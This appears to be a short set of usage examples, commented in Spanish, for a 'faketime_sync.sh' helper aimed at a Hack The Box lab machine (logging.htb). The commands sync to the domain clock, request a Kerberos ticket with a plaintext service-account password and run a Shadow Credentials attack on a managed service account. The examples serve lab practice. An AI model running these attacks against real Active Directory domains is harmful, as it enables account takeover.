# 1. Solo obtener hora virtual
./faketime_sync.sh 10.129.35.21 logging.htb

# 2. Obtener TGT automáticamente
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --tgt

# 3. Shadow Credentials directo
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --shadow 'msa_health$'

# 4. Ejecutar comando personalizado
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --exec 'klist'

# 5. Solo mostrar la hora virtual
./faketime_sync.sh 10.129.35.21 logging.htb --show-time
